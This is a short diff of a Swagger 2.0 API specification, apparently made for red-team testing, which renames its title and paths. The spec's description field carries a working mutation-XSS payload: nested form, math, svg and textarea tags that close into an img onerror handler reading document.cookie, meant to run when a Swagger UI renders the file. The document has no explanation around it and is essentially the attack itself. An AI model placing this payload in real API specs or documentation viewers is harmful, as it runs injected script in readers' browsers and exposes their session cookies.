@@ -1,10 +1,10 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: XSS Attack RedTeam
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
-basePath: /JSSResource/
+basePath: /
 produces:
   - application/xml
   - application/json
@@ -14,7 +14,7 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /RedTeam:
+  /:
     get:
       responses:
         '200':
@@ -23,7 +23,7 @@ paths:
         - RedTeam_XSS
       operationId: findAccounts
       summary: Finds all accounts
-  '/Redteam/Red/{id}':
+  '/{id}':
     delete:
       parameters:
         - description: |
